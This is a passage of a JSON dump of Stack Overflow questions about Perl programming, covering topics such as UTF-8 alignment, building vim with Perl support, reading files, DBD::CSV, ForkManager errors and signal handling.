@files;\n\nforeach $oldname (@files)\n{\n    $newname = $oldname;\n    #$newname =~ s/(^.{1,8})/\\U$1/e;\n    $newname =~ s/(^.{8})/uc($1)/e;\n\n    print \"$oldname -&gt; $newname\\n\";\n    rename(\"$oldname\",\"$newname\");\n}\n</code></pre>\n"},{"tags":["perl","encoding"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":728,"score":2,"question_id":2064543,"title":"How can I properly align UTF-8 strings with Perl's printf?","body":"<p>what is the right way to get here a beautiful output ( all lines the same indent )?</p>\n\n<pre><code>#!/usr/bin/env perl\nuse warnings;\nuse strict;\nuse DBI;\n\nmy $phone_book = [ [ qw( name number ) ],\n            [ 'Kroner', 123456789 ],\n            [ 'Holler', 123456789 ],\n            [ 'MÃ¼hÃig', 123456789 ],\n            [ 'Singer', 123456789 ],\n            [ 'Maurer', 123456789 ],\n];\n\nmy $dbh = DBI-&gt;connect( \"DBI:CSV:\", { RaiseError =&gt; 1 } );\n$dbh-&gt;do( qq{ CREATE TEMP TABLE phone_book AS IMPORT( ? ) }, {}, $phone_book );\n\nmy $sth = $dbh-&gt;prepare( qq{ SELECT name, number FROM phone_book } );\n$sth-&gt;execute;\n\nmy $array_ref = $sth-&gt;fetchall_arrayref();\n\nfor my $row ( @$array_ref ) {\n    printf \"%9s %10s\\n\", @$row;\n}\n\n# OUTPUT:\n\n#   Kroner  123456789\n#   Holler  123456789\n# MÃ¼hÃig  123456789\n#   Singer  123456789\n#   Maurer  123456789\n</code></pre>\n"},{"tags":["linux","perl","vim","compilation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12605859,"title":"Don't succeed include perl interpretator into vim","body":"<p>I have Ubuntu Ubuntu 12.04.1 and I try to build vim 7.3 with perl interpreter.<br>\nI have bash script: </p>\n\n<pre><code>#!/bin/bash\nexport CONF_OPT_GUI='--enable-gnome-check'\nexport CONF_OPT_PERL='--enable-perlinterp'\nexport CONF_OPT_PYTHON='--enable-pythoninterp'\nexport CONF_OPT_TCL='--enable-tclinterp --with-tcl=tclsh8.4'\nexport CONF_OPT_RUBY='--enable-rubyinterp'\nexport CONF_OPT_MZSCHEME='--disable-mzschemeinterp'\nexport CONF_OPT_CSCOPE='--enable-cscope'\nexport CONF_OPT_MULTIBYTE='--enable-multibyte'\nexport CONF_OPT_FEAT='--with-features=huge'\nexport CONF_OPT_COMPBY='\"--with-compiledby=rodnower@gmail.com\"'\n</code></pre>\n\n<p>which I run:</p>\n\n<pre><code>source scriptName\n</code></pre>\n\n<p>when I run 'make' following lines in the output related to perl:</p>\n\n<pre><code>rm -f xxd/xxd auto/osdef.h auto/pathdef.c auto/if_perl.c\n        --enable-perlinterp --enable-pythoninterp  \\\nchecking --enable-perlinterp argument... yes\nchecking for perl... /usr/bin/perl\n</code></pre>\n\n<p>and these lines are related to perl in src/aout/config.log:</p>\n\n<pre><code>  $ auto/configure --enable-gnome-check --enable-perlinterp --enable-pythoninterp --enable-tclinterp --with-tcl=tclsh8.4 --enable-rubyinterp --enable-cscope --enable-multibyte --with-features=huge --with-compiledby=rodnower@gmail.com --disable-mzschemeinterp --srcdir=. --cache-file=auto/config.cache\nconfigure:4991: checking --enable-perlinterp argument\nconfigure:5006: checking for perl\nconfigure:5024: found /usr/bin/perl\nconfigure:5036: result: /usr/bin/perl\nconfigure:5104: gcc -o conftest -O2 -fno-strength-reduce -Wall  -D_REENTRANT -D_GNU_SOURCE -DDEBIAN  -pipe -fstack-protector -I/usr/local/include -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64  -I/usr/lib/perl/5.14/CORE   -I/usr/local/include  -Wl,-E   -L/usr/local/lib conftest.c  -Wl,-E  -fstack-protector -L/usr/local/lib  -L/usr/lib/perl/5.14/CORE -lperl -ldl -lm -lpthread -lcrypt &gt;&amp;5\n/usr/bin/ld: cannot find -lperl\nac_cv_path_vi_cv_path_perl=/usr/bin/perl\nvi_cv_path_perl=/usr/bin/perl\nvi_cv_perllib=/usr/share/perl/5.14\nvi_cv_path_perl='/usr/bin/perl'\nvi_cv_perllib='/usr/share/perl/5.14'\n</code></pre>\n\n<p>After I see that perl not included into the compilation:</p>\n\n<pre><code>~/development/vim/vim$ src/vim --version | grep perl\n+netbeans_intg +path_extra -perl +persistent_undo +postscript +printer +profile\n</code></pre>\n\n<p>This is content of /usr/lib related to perl:</p>\n\n<pre><code>lrwxrwxrwx   1 root root           17 Sep 19 16:28 libperl.so.5.14 -&gt; libperl.so.5.14.2\n-rw-r--r--   1 root root      1584804 Aug 11 00:01 libperl.so.5.14.2\ndrwxr-xr-x   3 root root         4096 Aug 18 00:05 perl\ndrwxr-xr-x  13 root root         4096 Sep 20 00:24 perl5\n</code></pre>\n\n<p>And this is of /usr/bin:</p>\n\n<pre><code>-rwxr-xr-x  1 root   root        545 Aug 11 00:00 cpanp-run-perl\n-rwxr-xr-x  1 root   root       1065 Nov 15  2011 dh_perl_dbi\n-rwxr-xr-x  1 root   root      23599 Aug 11 00:00 find2perl\n-rwxr-xr-x  1 root   root      83452 Aug 19  2011 foomatic-perl-data\n-rwxr-xr-x  1 root   root    1462760 Aug 11 00:01 perl\n-rwxr-xr-x  1 root   root    1462760 Aug 11 00:01 perl5.14.2\n-rwxr-xr-x  1 root   root      45183 Aug 11 00:00 perlbug\n-rwxr-xr-x  1 root   root        125 Aug 11 00:01 perldoc\n-rwxr-xr-x  1 root   root      12318 Aug 11 00:00 perlivp\n-rwxr-xr-x  1 root   root      45183 Aug 11 00:00 perlthanks\n</code></pre>\n\n<p>These are package related to perl:</p>\n\n<pre><code>un  libansicolor-perl    &lt;none&gt;               (no description available)\nun  libarchive-tar-perl  &lt;none&gt;               (no description available)\nun  libattribute-handler &lt;none&gt;               (no description available)\nun  libautodie-perl      &lt;none&gt;               (no description available)\nii  libcairo-perl        1.081-1build2        Perl interface to the Cairo graphics library\nun  libcgi-pm-perl       &lt;none&gt;               (no description available)\nii  libclass-isa-perl    0.36-3               report the search path for a class's ISA tree\nun  libcompress-raw-bzip &lt;none&gt;               (no description available)\nun  libcompress-raw-zlib &lt;none&gt;               (no description available)\nun  libcompress-zlib-per &lt;none&gt;               (no description available)\nun  libcpan-meta-perl    &lt;none&gt;               (no description available)\nun  libcpan-meta-yaml-pe &lt;none&gt;               (no description available)\nun  libcpanplus-perl     &lt;none&gt;               (no description available)\nii  libcrypt-passwdmd5-p 1.3-10               interoperable MD5-based crypt() for perl\nun  libdbd-anydata-perl  &lt;none&gt;               (no description available)\nun  libdbd-csv-perl      &lt;none&gt;               (no description available)\nii  libdbd-mysql-perl    4.020-1build2        Perl5 database interface to the MySQL database\nii  libdbi-perl          1.616-1build2        Perl Database Interface (DBI)\nun  libdevel-dprof-perl  &lt;none&gt;               (no description available)\nun  libdigest-md5-perl   &lt;none&gt;               (no description available)\nun  libdigest-perl       &lt;none&gt;               (no description available)\nun  libdigest-sha-perl   &lt;none&gt;               (no description available)\nun  libdpkg-perl         &lt;none&gt;               (no description available)\nun  libencode-perl       &lt;none&gt;               (no description available)\nii  liberror-perl        0.17-1               Perl module for error/exception handling in an OO-ish wa\nun  libextutils-cbuilder &lt;none&gt;               (no description available)\nun  libextutils-command- &lt;none&gt;               (no description available)\nun  libextutils-install- &lt;none&gt;               (no description available)\nun  libextutils-parsexs- &lt;none&gt;               (no description available)\nii  libfile-basedir-perl 0.03-1fakesync1      Perl module to use the freedesktop basedir specification\nii  libfile-copy-recursi 0.38-1               Perl extension for recursively copying files and directo\nii  libfile-desktopentry 0.04-3               Perl module to handle freedesktop .desktop files\nii  libfile-mimeinfo-per 0.15-2               Perl module to determine file types\nun  libfile-path-perl    &lt;none&gt;               (no description available)\nun  libfile-spec-perl    &lt;none&gt;               (no description available)\nun  libfile-temp-perl    &lt;none&gt;               (no description available)\nun  libfont-freetype-per &lt;none&gt;               (no description available)\nii  libglib-perl         2:1.241-1            interface to the GLib and GObject libraries\nii  libgtk2-perl         2:1.223-1build3      Perl interface to the 2.x series of the Gimp Toolkit lib\nun  libgtk2-perl-doc     &lt;none&gt;               (no description available)\nii  libhtml-template-per 2.10-1               module for using HTML Templates with Perl\nun  libhttp-tiny-perl    &lt;none&gt;               (no description available)\nun  libi18n-langtags-per &lt;none&gt;               (no description available)\nun  libio-compress-base- &lt;none&gt;               (no description available)\nun  libio-compress-bzip2 &lt;none&gt;               (no description available)\nun  libio-compress-perl  &lt;none&gt;               (no description available)\nun  libio-compress-zlib- &lt;none&gt;               (no description available)\nun  libio-zlib-perl      &lt;none&gt;               (no description available)\nun  libipc-sharedcache-p &lt;none&gt;               (no description available)\nun  libjson-pp-perl      &lt;none&gt;               (no description available)\nun  liblocale-codes-perl &lt;none&gt;               (no description available)\nii  liblocale-gettext-pe 1.05-7build1         module using libc functions for internationalization in \nun  liblocale-maketext-p &lt;none&gt;               (no description available)\nun  liblocale-maketext-s &lt;none&gt;               (no description available)\nun  libmarc-charset-perl &lt;none&gt;               (no description available)\nun  libmath-bigint-perl  &lt;none&gt;               (no description available)\nun  libmath-complex-perl &lt;none&gt;               (no description available)\nun  libmime-base64-perl  &lt;none&gt;               (no description available)\nun  libmodule-build-perl &lt;none&gt;               (no description available)\nun  libmodule-corelist-p &lt;none&gt;               (no description available)\nun  libmodule-load-condi &lt;none&gt;               (no description available)\nun  libmodule-load-perl  &lt;none&gt;               (no description available)\nun  libmodule-metadata-p &lt;none&gt;               (no description available)\nun  libmodule-pluggable- &lt;none&gt;               (no description available)\nii  libnet-daemon-perl   0.48-1               Perl module for building portable Perl daemons easily\nun  libnet-ldap-perl     &lt;none&gt;               (no description available)\nun  libnet-perl          &lt;none&gt;               (no description available)\nun  libnet-ping-perl     &lt;none&gt;               (no description available)\nii  libpango-perl        1.222-1build1        Perl module to layout and render international text\nun  libparams-check-perl &lt;none&gt;               (no description available)\nun  libparent-perl       &lt;none&gt;               (no description available)\nun  libparse-cpan-meta-p &lt;none&gt;               (no description available)\nun  libperl-ostype-perl  &lt;none&gt;               (no description available)\nun  libperl4-corelibs-pe &lt;none&gt;               (no description available)\nii  libperl5.14          5.14.2-6ubuntu2.1    shared Perl library\nun  libperl5.8           &lt;none&gt;               (no description available)\nii  libplrpc-perl        0.2020-2             Perl extensions for writing PlRPC servers and clients\nun  libpod-escapes-perl  &lt;none&gt;               (no description available)\nun  libpod-parser-perl   &lt;none&gt;               (no description available)\nun  libpod-plainer-perl  &lt;none&gt;               (no description available)\nun  libpod-simple-perl   &lt;none&gt;               (no description available)\nun  libqtcore4-perl      &lt;none&gt;               (no description available)\nun  libqtgui4-perl       &lt;none&gt;               (no description available)\nun  libscalar-list-utils &lt;none&gt;               (no description available)\nun  libshell-perl        &lt;none&gt;               (no description available)\nun  libsql-statement-per &lt;none&gt;               (no description available)\nun  libstorable-perl     &lt;none&gt;               (no description available)\nii  libswitch-perl       2.16-2               switch statement for Perl\nun  libsys-syslog-perl   &lt;none&gt;               (no description available)\nun  libterm-readkey-perl &lt;none&gt;               (no description available)\nun  libterm-readline-gnu &lt;none&gt;               (no description available)\nun  libterm-readline-per &lt;none&gt;               (no description available)\nun  libtest-harness-perl &lt;none&gt;               (no description available)\nun  libtest-simple-perl  &lt;none&gt;               (no description available)\nii  libtext-charwidth-pe 0.04-7build1         get display widths of characters on the terminal\nii  libtext-iconv-perl   1.7-5                converts between character sets in Perl\nii  libtext-wrapi18n-per 0.06-7               internationalized substitute of Text::Wrap\nun  libthread-queue-perl &lt;none&gt;               (no description available)\nun  libthreads-perl      &lt;none&gt;               (no description available)\nun  libthreads-shared-pe &lt;none&gt;               (no description available)\nun  libtime-hires-perl   &lt;none&gt;               (no description available)\nun  libtime-local-perl   &lt;none&gt;               (no description available)\nun  libtime-piece-perl   &lt;none&gt;               (no description available)\nun  libunicode-collate-p &lt;none&gt;               (no description available)\nii  libuuid-perl         0.02-4ubuntu1        Perl extension for using UUID interfaces as defined in e\nun  libversion-perl      &lt;none&gt;               (no description available)\nun  libversion-requireme &lt;none&gt;               (no description available)\nun  libxml-sax-perl      &lt;none&gt;               (no description available)\nun  libxsloader-perl     &lt;none&gt;               (no description available)\nii  libyaml-tiny-perl    1.50-1               Perl module for reading and writing YAML files\nii  perl                 5.14.2-6ubuntu2.1    Larry Wall's Practical Extraction and Report Language\nii  perl-base            5.14.2-6ubuntu2.1    minimal Perl system\nun  perl-dbdabi-94       &lt;none&gt;               (no description available)\nun  perl-doc             &lt;none&gt;               (no description available)\nii  perl-modules         5.14.2-6ubuntu2.1    Core Perl modules\nun  perl5                &lt;none&gt;               (no description available)\nun  perl5-base           &lt;none&gt;               (no description available)\nun  perlapi-5.14.2       &lt;none&gt;               (no description available)\nun  perlsgml             &lt;none&gt;               (no description available)\nun  podlators-perl       &lt;none&gt;               (no description available)\n</code></pre>\n\n<p>I completely dont know what to do...<br>\nThank you for ahead.</p>\n"},{"tags":["perl","string","open","slurp"],"answer_count":11,"favorite_count":5,"up_vote_count":30,"down_vote_count":0,"view_count":26801,"score":30,"question_id":953707,"title":"In Perl, how can I read an entire file into a string?","body":"<p>I'm trying to open an .html file as one big long string.  This is what I've got:</p>\n\n<pre><code>open(FILE, 'index.html') or die \"Can't read file 'filename' [$!]\\n\";  \n$document = &lt;FILE&gt;; \nclose (FILE);  \nprint $document;\n</code></pre>\n\n<p>which results in: </p>\n\n<blockquote>\n  <p><code>&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN</code></p>\n</blockquote>\n\n<p>However, I want the result to look like: </p>\n\n<blockquote>\n  <p><code>&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"<br>\n  \"http://www.w3.org/TR/html4/loose.dtd\"&gt;<br>\n  &lt;html&gt;<br>\n  &lt;head&gt;<br>\n  &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"&gt;\n  </code></p>\n</blockquote>\n\n<p>This way I can search the entire document more easily.</p>\n\n<p>Anyone know how to do this? Thanks.</p>\n"},{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":382,"score":0,"question_id":8433837,"title":"Match full stop in a sentence using perl","body":"<p>how can I match full stop (period) in a sentence, but I don't want to match floating numbers or words that contain numbers?</p>\n\n<p>eg. </p>\n\n<pre><code>$sen = \"I'm going to match full.stop in sentence 3.142\";\nif ($sen =~ (s/\\.//)) {\n    print $1;\n}\n</code></pre>\n\n<p><strong>output:</strong></p>\n\n<pre><code>fullstop\n</code></pre>\n\n<p>In this example I only want to match words or alphanumeric words not numbers.</p>\n"}]}
{"total":22324,"page":15,"pagesize":100,"questions":[{"tags":["java","perl","bash","pipe"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12174161,"title":"Perl issues bash pipe into Java","body":"<p>I am a Perl beginner. I have this Perl snippet</p>\n\n<pre><code>$normal_pileup = \"samtools mpileup -q 1 -f XXXX YYYYY\";\n$tumor_pileup = \"samtools mpileup -q 1 -f XXXX ZZZZZ\";\n\nbash -c \\\"java -jar ttt.jar  &lt;\\($normal_pileup\\) &lt;\\($tumor_pileup\\) output\n</code></pre>\n\n<p>They try to issue a system call that pipes input from these commands into a Java program. I couldn't make it work. Can anybody please tell me how to do it?</p>\n"},{"tags":["perl","date","optimization","data-conversion"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":118,"score":2,"question_id":12605585,"title":"Optimize Perl script - runs too slow on 40GB+ files","body":"<p>I made the following Perl script to handle some file manipulation at work, but it's running far too slowly at the minute to be put in production.</p>\n\n<p>I don't know Perl very well (not one of my languages), so can someone help me identify and replace parts of this script that would be slow given it's processing ~40 million lines?</p>\n\n<p>Data being piped in is in the format:</p>\n\n<pre><code>col1|^|col2|^|col3|!|\ncol1|^|col2|^|col3|!|\n... 40 million of these.\n</code></pre>\n\n<p>The date_cols array is calculated before this part of the script and basically holds the index of columns containing dates in the pre-converted format.</p>\n\n<p>Here's the part of the script that will be executed for every input row.  I've cleaned it up a little and added comments, but let me know if anything else is needed:</p>\n\n<pre><code>## Read from STDIN until no more lines are arailable.\nwhile (&lt;STDIN&gt;)\n{       \n    ## Split by field delimiter\n    my @fields = split('\\|\\^\\|', $_, -1);   \n\n    ## Remove the terminating delimiter from the final field so it doesn't\n    ## interfere with date processing.\n    $fields[-1] = (split('\\|!\\|', $fields[-1], -1))[0];\n\n    ## Cycle through all column numbres in date_cols and convert date\n    ##  to yyyymmdd\n    foreach $col (@date_cols)\n    {\n        if ($fields[$col] ne \"\")\n        {\n            $fields[$col] = formatTime($fields[$col]);\n        }\n    }\n\n    print(join('This is an unprintable ASCII control code', @fields), \"\\n\");\n}           \n\n## Format the input time to yyyymmdd from 'Dec 26 2012 12:00AM' like format.\nsub formatTime($)\n{\n    my $col = shift;        \n\n    if (substr($col, 4, 1) eq \" \") {\n        substr($col, 4, 1) = \"0\";\n    }       \n    return substr($col, 7, 4).$months{substr($col, 0, 3)}.substr($col, 4, 2);\n}\n</code></pre>\n"},{"tags":["perl","logging","perl-module"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12594697,"title":"How to differentiate between different loggers in perl modules?","body":"<p>I am facing problem in using logger in 1 of my script which use/require some modules where there is different initialization of perl logger.\nIf I initialize the logger in my script after the initialization of module than this logger obj works fine but if initialization done before loading module than it is working only until module is uploaded after that it not working.\nModules I am initializing in myscipt have there own instance of logger.</p>\n\n<p>My code looks like this -</p>\n\n<p>use Log::Log4perl qw(get_logger :levels :nowarn);</p>\n\n<p>my $logger = \"\";</p>\n\n<p>Log::Log4perl::init(\"some_file\");</p>\n\n<p>$logger = get_logger;</p>\n\n<p>$logger->info(\"Logger Check1\");\nThis is working fine.</p>\n\n<p>Some code of 100 lines based on which we need to call some module.</p>\n\n<p>require $module_name;</p>\n\n<p>This module have logger initialization same as above which is working fine.</p>\n\n<p>$logger->info(\"Logger Check2\");</p>\n\n<p>This statement is not working fine.</p>\n"},{"tags":["perl","format","associative-array"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12606045,"title":"Converting form layout to table (csv) layout in perl","body":"<p>I have an input file</p>\n\n<blockquote>\n  <p>inputfile.txt</p>\n</blockquote>\n\n<pre><code>        name: George\n         age: 5\n      nature: curious\n       likes: banana\n</code></pre>\n\n<p>This is what I call a form layout. I am trying to convert this in to a table layout, CSV. For instance:</p>\n\n<pre><code>name,age,nature,likes\nGeorge,5,curious,banana\n</code></pre>\n\n<p>So, I read the file, split on \": and \\n\" and place values in to a hash. Then push that hash in to an array so I can take them out later. Here is what I have done so far.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\n\n open (MYFILE, 'inputfile.txt');\n my @records;\n while (&lt;MYFILE&gt;) {\n        chomp;\n        my %values = split(/[:\\n]/,$_);\n        push @records,%values;\n }\n close (MYFILE);\n</code></pre>\n\n<p>By this, I guess <code>@records={[name=George],[age=5],[nature=curious],[likes=banana]}</code> would have happened.</p>\n\n<p>Now, how do I get each hash out of the array <code>@records</code>? when I try something like:</p>\n\n<pre><code> foreach my $record(@records){\n     my %record = $record;\n     for my $key(keys %record){\n        print \"key : $key\\n\";\n     }\n }\n</code></pre>\n\n<p>It outputs all tokens one after other unlike what is expected (just the key).</p>\n"},{"tags":["perl","csv","dbd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":277,"score":0,"question_id":3350775,"title":"DBD::CSV: Returns header in lower case","body":"<p>I've got a problem with the module <strong>DBD::CSV</strong> v0.30. \nSince a update to the newes version, all headers in the fetchrow_hashref generated hash are lower case instead of mixed case. </p>\n\n<p>Finaly the data will be committed to a mysql database and the column header should be mixed case.</p>\n\n<p>This is a snipet of my script using the <strong>DBD::CSV</strong></p>\n\n<pre><code>my $csv_dbh = DBI-&gt;connect(\"DBI:CSV:f_dir=\\.;csv_eol=\\n\");\n$csv_dbh-&gt;{f_dir} = $ElementConfig-&gt;{_DIR} if defined($ElementConfig-&gt;{_DIR});\n$csv_dbh-&gt;{csv_sep_char} = \"$Seperator\" if (defined($Seperator));\n$csv_dbh-&gt;{csv_eol} = $csv_eol if (defined($csv_eol));\n$csv_dbh-&gt;{csv_allow_whitespace} = $csv_allow_whitespace if (defined($csv_allow_whitespace));\nmy $CSV_Select;\nunless (defined($ref_FullSQLSt)) { \n    // Standard \"SELECT * FROM filname.txt\"\n    $CSV_Select = \"SELECT \".${$ref_CSVSelect}.\" FROM $File \".${$ref_CSVWhere};\n} else {\n    $CSV_Select = ${$ref_FullSQLSt};\n}\nmy $sth = $csv_dbh-&gt;prepare($CSV_Select);\nmy $res = $sth-&gt;execute();\nwhile (my $row = $sth-&gt;fetchrow_hashref()) {\n    my $PKeys = $index;\n    if (defined($ElementConfig-&gt;{_FILES}-&gt;{$File}-&gt;{_dkey})) {\n        my $NewPKeys = \"\";\n        for my $key (split (/\\s*\\,\\s*/,$ElementConfig-&gt;{_FILES}-&gt;{$File}-&gt;{_dkey})) {\n            if (defined($row-&gt;{$key})) {\n                $NewPKeys .= $row-&gt;{$key};\n            }\n        }\n        $PKeys = $NewPKeys if ($NewPKeys);\n    }\n\n    unless (defined($DataHash-&gt;{$DBConfig-&gt;{TBLPREFIX} . $ElementConfig-&gt;{_FILES}-&gt;{$File}-&gt;{_dtbl}}-&gt;{$PKeys})) {\n        $DataHash-&gt;{$DBConfig-&gt;{TBLPREFIX} . $ElementConfig-&gt;{_FILES}-&gt;{$File}-&gt;{_dtbl}}-&gt;{$PKeys} = $row;\n        $index ++;\n    }\n}\n</code></pre>\n\n<p>This is a snipet of the csv file:</p>\n\n<pre><code>CELL    DATE    avgRxLevUl  avgRxLevDl  RXQUALUL0 \nRTAL3D  08.12.2009 15:50    -96.25072834    -92.32065149    179594\n</code></pre>\n\n<p>Actual the fetchrow_hashref looks like this:</p>\n\n<pre><code>$var-&gt; {\n   'cell' =&gt; 'RTAL3D',\n   'date' =&gt; '08.12.2009',\n   'avgrxlevu1' =&gt; -96.25072834\n   ...\n}\n</code></pre>\n\n<p>I tried several things with the $sth->fetchrow_hashref() method. I used the parameter \"NAME\", \"NAME_lc\" and \"NAME_uc\". The first and the second convert the headers to lowercase and the third to uppercase.</p>\n\n<p>Thanks for your help.</p>\n"},{"tags":["multithreading","perl","forking"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12605622,"title":"Perl Module ForkManager not working","body":"<p>My error is as follows</p>\n\n<p>Cannot start another process while you are in the child process at /usr/lib/perl5/site_perl/5.8.6/Parallel/ForkManager.pm line 463.</p>\n\n<p>The part of my code that is having issues is below, below my code is the sub routine thats failing in forkmanager, I cannot figure out why. Without forkmanager I can run just fine.</p>\n\n<pre><code>my $pm = new Parallel::ForkManager($MAX_PROCESSES);\nfor (0..$SCOUNT)\n{\nmy $pid = $pm-&gt;start and next;\n    my %shash = ();\n    %shash =\n    (   ID      =&gt; \"$SREF-&gt;[$_]-&gt;[0]\",\n        typeID  =&gt; \"$SREF-&gt;[$_]-&gt;[1]\",\n        extIP   =&gt; \"$SREF-&gt;[$_]-&gt;[2]\",\n        intIP   =&gt; \"$SREF-&gt;[$_]-&gt;[3]\",\n        NAME    =&gt; \"$SREF-&gt;[$_]-&gt;[4]\",\n        buTYPE  =&gt; \"NULL\"\n    );\n    if ($shash{typeID} =~ /^(4|16|17|25|27|28|42|49|50|51|54|58|60|63|19)$/){$shash{buTYPE} = 'LINUX DEDICATED';}\n    if ($shash{typeID} =~ /^(11|14|22|32|34|36|37|46)$/)                    {$shash{buTYPE} = 'LINUX FULL';}\n    if ($shash{typeID} =~ /^(44)$/)                                         {$shash{buTYPE} = 'EMAIL MARKETER';}\n    if ($shash{typeID} =~ /^(43)$/)                                         {$shash{buTYPE} = 'TYip1';}\n    if ($shash{typeID} =~ /^(45)$/)                                         {$shash{buTYPE} = 'DDDOMAINS';}\n    if ($shash{typeID} =~ /^(56)$/)                                         {$shash{buTYPE} = 'AT MAIL';}\n    if ($shash{typeID} =~ /^(65|66)$/)                                      {$shash{buTYPE} = 'ENT MAIL';}\n    if ($shash{typeID} =~ /^(1|3)$/)                                        {$shash{buTYPE} = 'LINUX PROD';}\n\n    if ($shash{buTYPE} eq 'LINUX DEDICATED' || $shash{buTYPE} eq 'LINUX FULL')\n    #if ($shash{buTYPE} eq 'LINUX FULL')\n    {\n        next if (`grep $shash{NAME} $excludes`);\n        my $ip;\n        my $ipchoice=0;\n        print \"Doing $shash{NAME}.\\n\";\n        my $testport = testport(\"$shash{intIP}\",'1500');\n        if(!$testport)\n        {\n            $ipchoice=1;\n            $testport = testport(\"$shash{extIP}\",'1500');\n        }\n        unless ($testport)\n        {\n            log_event(\"$log/rsync_error.$date_string\",\"Port 1500 closed for $shash{NAME}\\n\");\n            next;\n        }\n        if ($ipchoice==0)\n        {   $ip = $shash{intIP};\n        }else{\n            $ip = $shash{extIP};\n        }\n#       send_file(\"$repo/rsyncd.conf\",\"$shash{intIP}\",\"/etc/rsyncd.conf\");\n        check_rsync($shash{NAME},$ip);\n#       do_backup($shash{NAME},$ip,$shash{buTYPE});\n    }\n    $pm-&gt;finish;\n}\n$pm-&gt;wait_all_children;\n</code></pre>\n\n<p>ForkManager.pm coding.</p>\n\n<pre><code>sub start { my ($s,$identification)=@_;\n  die \"Cannot start another process while you are in the child process\"\n    if $s-&gt;{in_child};\n  while ($s-&gt;{max_proc} &amp;&amp; ( keys %{ $s-&gt;{processes} } ) &gt;= $s-&gt;{max_proc}) {\n    $s-&gt;on_wait;\n    $s-&gt;wait_one_child(defined $s-&gt;{on_wait_period} ? &amp;WNOHANG : undef);\n  };\n  $s-&gt;wait_children;\n  if ($s-&gt;{max_proc}) {\n    my $pid=fork();\n    die \"Cannot fork: $!\" if !defined $pid;\n    if ($pid) {\n      $s-&gt;{processes}-&gt;{$pid}=$identification;\n      $s-&gt;on_start($pid,$identification);\n    } else {\n      $s-&gt;{in_child}=1 if !$pid;\n    }\n    return $pid;\n  } else {\n    $s-&gt;{processes}-&gt;{$$}=$identification;\n    $s-&gt;on_start($$,$identification);\n    return 0; # Simulating the child which returns 0\n  }\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12601385,"title":"Validate data in textfile which is in UTF8 format","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12346419/automatic-syntax-check-for-several-search-terms-or-keywords-using-perl\">Automatic syntax check for several search terms or keywords using Perl</a>  </p>\n</blockquote>\n\n\n\n<p>I want to validate some data entered in a text file. The data would be some thing like this as below:</p>\n\n<pre><code> illegal*\n unauthoriz* OR (without w/2 authori*)\n special w/3 (fee* OR pay*)\n kickback* OR (kick w/3 back*))\n off  w/3 book*\n</code></pre>\n\n<p>If you observe there is a extra closed bracket in line 4 and a extra space in line 5. How do i validate this using a Perl script. Please help me on this as i have no idea on where to start but this is very important for me. Thanks</p>\n"},{"tags":["perl","loops","signals"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":12602252,"title":"How to jump after while(1) via SIGHUP in Perl?","body":"<p>I like to jump after the <code>while(1)</code>. How to do that? <strong>Checking a special variable and <code>last</code> is not ok because the while expression contains an <em>blocking call</em> so it would be too late if the expression is checked.</strong></p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse feature qw( say );\nuse sigtrap 'handler', \\&amp;hup_handler, 'HUP';\nmy $counter = 0;\nsub hup_handler { say 'HUP!!!'; $counter = 0; return; }\nsay 'It starts here';\nwhile ( 1 ) {\n    sleep( 1 ); # Blocking call is in reality within while expression.\n    say ++$counter;\n}\nsay 'It ends here';\n</code></pre>\n"},{"tags":["perl","substring"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":12603324,"title":"Finding multiple substrings in a single string using Perl","body":"<p>I need to take the following string and break it into chunks:</p>\n\n<blockquote>\n  <p>[ToNode=cup-subscriber][Reason=Critical service is\n  down][FromNode=cup-publisher][AppID=Cisco UP Server Recovery Manager]</p>\n</blockquote>\n\n<p>Each chunk is encapsulated in brackets.  I'm looking to do this in Perl, and am looking for direction on a method.</p>\n\n<p>Thanks!</p>\n"},{"tags":["windows","perl"],"answer_count":3,"favorite_count":12,"up_vote_count":18,"down_vote_count":0,"view_count":4204,"score":18,"question_id":4727480,"title":"How do I make my Perl scripts act like normal programs on Windows?","body":"<p>I want my Perl scripts to behave just like any other executable (*.exe file).</p>\n\n<ul>\n<li>When I double-click on <code>myscript.pl</code> I want it to execute instead of opening in a text editor.</li>\n<li>I want to run <code>myscript.pl</code> instead of <code>perl myscript.pl</code>.</li>\n<li>I really want to run <code>myscript</code> instead of <code>myscript.pl</code>.</li>\n<li>I want to run <code>program | myscript</code> instead of <code>program | perl myscript.pl</code>.</li>\n<li>I want to be able to run my script via drag &amp; drop.</li>\n</ul>\n\n<hr>\n\n<p>There are a number of changes you have to make on Windows to make all of \nthese things work. Users typically stumble upon things that <em>don't</em> work one at \na time; leaving them confused whether they've made an error, there's a bug in \nPerl, there's a bug in Windows, or the behavior they want just isn't possible. \nThis question is intended to provide a single point of reference for making \neverything work up front; ideally before these problems even occur.</p>\n\n<p>Related questions:</p>\n\n<ul>\n<li><a 